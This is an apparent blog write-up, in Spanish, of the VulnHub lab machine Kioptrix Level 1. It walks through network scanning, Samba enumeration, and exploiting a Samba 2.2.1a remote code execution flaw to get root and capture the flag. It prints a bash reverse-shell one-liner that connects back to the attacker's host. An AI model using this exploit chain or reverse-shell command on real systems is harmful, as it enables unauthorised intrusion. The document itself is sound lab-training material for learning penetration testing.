---
title: Write-Up de la máquina Kioptrix Level 1 - VulnHub
date: 2024-04-08 10:00:00 - 0500
categories: [VulnHub]
tags: [vulnhub, kiptriox, netbios-ssn,samba, metasploit, rce, reverse_shell] 
image: /assets/img/kioptrix1.png
alt: "Kioptrix Level 1"
# TAG names should always be lowercase
---


### Reconocimiento

>En primer lugar aplicaremos reconocimiento para identificar los equipos que hay en la red con el comando `arp-scan -I ens33 --localnet`

![](/assets/img/k1.png){: width="700" height="400" }

>Como podemos ver la máquina Kioptrix que estoy ejecutando paralelamente con VMware tiene asignada la IP 192.168.1.14
>
>Sabiendo esto, realizaremos un escaneo con Nmap buscando puertos abiertos mediante el protocolo TCP:

![](/assets/img/k2.png){: width="700" height="400" }


> Primeramente podemos determinar que nos encontramos ante una máquina Linux debido a que su TTL=64.
> 
> A continuación realizaremos un escaneo más exhaustivo con Nmap sobre los puertos que están abiertos usando un conjunto de scripts de reconocimiento:

![](/assets/img/k3.png){: width="700" height="400" }

>Haremos uso de la herramienta **SSLScan** para evaluar la configuración SSL del servidor en busca de posibles vulnerabilidades como HeartBleed:

![](/assets/img/k4.png){: width="700" height="400" }

>No lo es, por lo que pasaremos a enumerar el servicio netbios-ssn que corre por el puerto 139 para intentar conocer la versión de Samba haciendo uso de Metasploit:

La interfaz NETBIOS proporciona 3 ervicios distintos:
- de nombres (NetBIOS-NS) - puerto 137
- de distribución de datagramas (NetBIOS-DGM) - puerto 138
- **de sesión (NetBIOS-SSN) para comunicación orientada a conexión - puerto 139**

![](/assets/img/k5.png){: width="700" height="400" }

>Haciendo uso del framework hemos podido enumerar el puerto 139 y sabemos que está usando la versión 2.2.1a de Samba


### Explotación

>Vamos a buscar si hay vulnerabilidades asociadas a la versión de Samba que acabamos de enumerar:

![](/assets/img/k6.png){: width="700" height="400" }

>Nos encontramos con una posible Remote Code Execution (RCE), así que miraremos el contenido del archivo que explota la [vulnerabilidad](https://www.exploit-db.com/exploits/10) con el comando  `searchsploit -x multiple/remote/10.c`.

![](/assets/img/k7.png){: width="700" height="400" }

![](/assets/img/k8.png){: width="700" height="400" }

>En las anteriores imágenes que muestran el contenido del archivo podemos ver un ejemplo de uso del script así como su sintaxis.
>
>Una vez sabido esto, haremos el archivo .c ejecutable y usaremos el parámetro -b para especificar que estamos ante una maquina Linux:

![](/assets/img/k9.png){: width="700" height="400" }


>Hemos conseguido ejecutar la RCE y estamos autenticados como usuario root. Adicionalmente conseguimos una reverse shell haciendo uso del comando `bash -i >& /dev/tcp/192.168.1.13/4646 0>&1` 

![](/assets/img/k10.png){: width="700" height="400" }

>Para concluir encontramos la flag en el directorio var/mail:

![](/assets/img/k11.png){: width="700" height="400" }
